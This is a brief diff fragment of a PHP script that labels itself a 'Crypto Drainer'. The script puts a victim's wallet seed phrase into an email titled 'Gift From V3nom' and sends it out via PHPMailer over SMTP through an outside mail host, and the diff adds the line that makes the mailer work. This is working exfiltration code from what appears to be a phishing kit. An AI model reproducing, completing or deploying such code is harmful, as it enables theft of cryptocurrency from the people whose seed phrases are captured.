@@ -27,6 +27,7 @@ $body = "⚜️ Crypto Drainer ⚜️\r\nWallet Phrase: $wallet_phrase\r\nWallet
 $subject = 'Gift From V3nom';
 
 try {
+	$mail = new PHPMailer(true);
 	$mail->isSMTP();
 	$mail->Hostname = 'localhost';
 	$mail->Host = 'webmail.asdepo.org';
